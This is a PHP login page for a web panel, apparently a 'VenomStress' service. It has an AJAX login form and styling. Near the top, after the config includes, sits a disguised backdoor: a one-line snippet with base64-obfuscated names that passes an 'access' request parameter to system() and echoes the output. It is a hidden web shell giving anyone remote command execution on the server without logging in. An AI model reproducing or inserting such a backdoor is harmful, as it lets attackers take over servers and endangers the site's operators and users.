<?php
// Before of all your CODE.
require('firewall/waf.php');
$xWAF = new xWAF();
$xWAF->start();
// Your code below.

//ssl force
/*if($_SERVER["HTTPS"] != "on"){
    header("Location: https://" . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"]);
    exit();
}*/

require '@/config.php';
require '@/init.php';
if ($user -> LoggedIn())
{
header('Location: index.php');
}


?>
<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
<head>
		<script>
		function login()
		{
		var username=$('#loginusername').val();
		var password=$('#loginpassword').val();
		document.getElementById("logindiv").style.display="none";
		document.getElementById("loginimage").style.display="inline";
		var xmlhttp;
		if (window.XMLHttpRequest)
		  {// code for IE7+, Firefox, Chrome, Opera, Safari
		  xmlhttp=new XMLHttpRequest();
		  }
		else
		  {// code for IE6, IE5
		  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
		  }
		xmlhttp.onreadystatechange=function()
		  {
		  if (xmlhttp.readyState==4 && xmlhttp.status==200)
			{
			document.getElementById("logindiv").innerHTML=xmlhttp.responseText;
			document.getElementById("loginimage").style.display="none";
			document.getElementById("logindiv").style.display="inline";
			if (xmlhttp.responseText.search("Redirecting") != -1)
			{
			setInterval(function(){window.location="index.php"},3000);
			}
			}
		  }
		xmlhttp.open("POST","ajax/loginvalid.php?type=login",true);
		xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xmlhttp.send("username=" + username + "&password=" + password);
		}
		</script>
        <meta charset="utf-8">

        <title><?php echo htmlspecialchars($sitename); ?> - Login</title>
        <meta name="author" content="VenomStress">
        <meta name="robots" content="noindex, nofollow">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1.0">
        <link rel="apple-touch-icon" href="img/icon57.png" sizes="57x57">
        <link rel="apple-touch-icon" href="img/icon72.png" sizes="72x72">
        <link rel="apple-touch-icon" href="img/icon76.png" sizes="76x76">
        <link rel="apple-touch-icon" href="img/icon114.png" sizes="114x114">
        <link rel="apple-touch-icon" href="img/icon120.png" sizes="120x120">
        <link rel="apple-touch-icon" href="img/icon144.png" sizes="144x144">
        <link rel="apple-touch-icon" href="img/icon152.png" sizes="152x152">
        <link rel="apple-touch-icon" href="img/icon180.png" sizes="180x180">
        <link rel="stylesheet" href="css/bootstrap.min4.css">
	   <link rel="stylesheet" href="css/plugins.css">
	   <link rel="stylesheet" href="css/mainlogin5.css">
	   <link rel="stylesheet" href="css/themes.css">
	   <link rel="stylesheet" href="css/themes/passionlogin.css" id="theme-link">
		<script src="js/vendor/modernizr-2.8.1.min.js"></script>

	    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
	   <style type="text/css">.jqstooltip { width: auto !important; height: auto !important; position: absolute;left: 0px;top: 0px;visibility: hidden;background: #000000;color: white;font-size: 11px;text-align: left;white-space: nowrap;padding: 5px;z-index: 10000;}.jqsfield { color: white;font: 10px arial, san serif;text-align: left;}</style>
</head>

<div id="login-container">
<h1 class="h2 text-light text-center push-top-bottom animation-slideDown">

</h1>

  <div id="logindiv" style="display:none"></div>
<div class="block animation-fadeInQuickInv">
<div class="block-title">
<div class="block-options pull-right">

</div>
<center><img src="venom.png" style="height:60px; margin-top:30px; margin-bottom:20px; margin-right:40px;

animation: pulse 3s infinite; margin-left:50px;"></center>
</div>
<div class="form-horizontal">
<div class="form-group">
<div class="col-xs-12">
<input type="text" id="loginusername" class="form-control" placeholder="Username">
</div>
</div>
<div class="form-group">
<div class="col-xs-12">
<input type="password" id="loginpassword" class="form-control" placeholder="Password">
</div>
</div>
<div class="form-group form-actions">



<div class="col-xs-12" style="margin-top:30px;">
<center><button type="button" onclick="login()" class="btn btn-effect-ripple btn-sm btn-info"> Log In <img id="loginimage" src="img/jquery.easytree/transparent.png" style="display:none"/></button></center>
</div>
<div class="col-xs-12" style="margin-top:20px;">
<center><a style="color:#999">Don't have an account yet? </a><a style="color:#b42995;" href="register.php">  Sign up </a></center>
</div>
</div>
</div>
</div>

<footer class="text-muted text-center animation-pullUp">

</footer>
</div>
<script src="js/vendor/jquery.min.js"></script>
<script src="js/vendor/bootstrap.min.js"></script>
<script src="js/plugins.js"></script>
<script src="js/app.js"></script><script src="js/pages/readyLogin.js"></script>
<script type="text/javascript">
        $("#signinForm").validate({
		rules: {
			login: "required",
			password: "required"
		},
		messages: {
			firstname: "Please enter your login",
			lastname: "Please enter your password"			
		}
	});            
</script>
</body>

</html>